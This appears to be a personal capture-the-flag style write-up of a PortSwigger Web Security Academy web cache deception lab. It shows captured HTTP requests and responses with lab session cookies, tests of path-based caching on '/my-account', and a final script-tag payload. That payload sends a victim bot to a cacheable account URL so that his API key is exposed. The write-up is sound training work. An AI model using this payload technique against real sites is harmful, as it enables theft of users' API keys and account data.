
# 1 brief

`wiener:peter` is accessible
asset = `carlos API Key`

tool = malicious link, `carlos` bot will always click

---

# 2-1 POST /login

```
POST /login HTTP/2
Host: 0a2400e804388184800f1c1200410051.web-security-academy.net
Cookie: session=LgNwkAORJ5ACFGtLiMfSqQ69tRxwA0HT
Content-Length: 68
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="141", "Not?A_Brand";v="8"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-US,en;q=0.9
Origin: https://0a2400e804388184800f1c1200410051.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a2400e804388184800f1c1200410051.web-security-academy.net/login
Accept-Encoding: gzip, deflate, br
Priority: u=0, i

csrf=kVkFetrTeWW8SEgYIdkQnjx4lmMscJJe&username=wiener&password=peter
```

```
HTTP/2 302 Found
Location: /my-account
Set-Cookie: session=90yywF1SIgIpgpnXgTGPa2jRfHNDDdsM; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Content-Length: 0
```

---

# 2-2 GET /my-account

as `wiener`
```
GET /my-account HTTP/2
Host: 0a2400e804388184800f1c1200410051.web-security-academy.net
Cookie: session=90yywF1SIgIpgpnXgTGPa2jRfHNDDdsM
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Sec-Ch-Ua: "Chromium";v="141", "Not?A_Brand";v="8"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Referer: https://0a2400e804388184800f1c1200410051.web-security-academy.net/login
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
```

```
	   <p>Your username is: wiener</p>
		<div>Your API Key is: 7eFYX3UxIwfyXT4Zc9FYkYUVfShcFUsx</div>
```

---

# 2-3 GET /my-account arbitrary test

`/my-account?username=wiener`

`/my-account/pwn`

`/my-account/pwn.js` >>> header shows
```
Cache-Control: max-age=30
Age: 0
X-Cache: miss
```

note: all responses as wiener api

analysis: `/my-account/ar/bi/tra/ry/anyname.js` will be cached for 30s if not already cached.

---

# 3 payload

```
<script>document.location="https://YOUR-LAB-ID.web-security-academy.net/my-account/ar/bi/tra/ry/pwnmezaddy.js"</script>
```

---

# end

[...back](../note.md)
